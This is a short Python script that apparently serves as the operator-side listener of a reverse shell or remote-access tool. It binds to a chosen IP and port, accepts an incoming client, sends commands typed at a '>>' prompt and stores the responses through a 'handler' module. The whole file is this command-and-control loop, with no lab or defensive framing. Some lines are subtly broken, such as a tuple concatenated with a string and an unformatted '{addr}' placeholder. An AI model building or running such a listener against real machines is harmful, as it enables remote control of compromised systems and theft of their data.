import socket
import handler

def main():
    x = str(input("[*] Listener IP   :   "))
    y = int(input("[*] Listener PORT :   "))

    try:
        soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        soc.bind((x, y))
        soc.listen()
        print(handler.GREEN + "[*] Handler listening..." + handler.RESET)
 
        while True:
            try:
                conn, addr = soc.accept()
                print(handler.GREEN + "[*] Connected to client:", addr + handler.RESET)

                while True:
                    try:
                        cmd = input(">> ")
                        conn.send(cmd.encode())
                        res = conn.recv(8192).decode()

                        if res == "0":
                            print(handler.RED + "[!] Invalid command !" + handler.RESET)
                        else:
                            handler.storage(res)

                    except Exception as e:
                        conn.close()
                        print(handler.RED + "[!] Client disconnected {addr}" + handler.RESET)
                        print(handler.GREEN + "[*] Waiting for clients..." + handler.RESET)
                        break

            except Exception as e:
                print(handler.RED + "[*] Error accepting connection" + handler.RESET)

    except Exception as e:
        print(handler.RED + f"[*] Unexpected error" + handler.RESET)

if __name__ == "__main__":
    main()
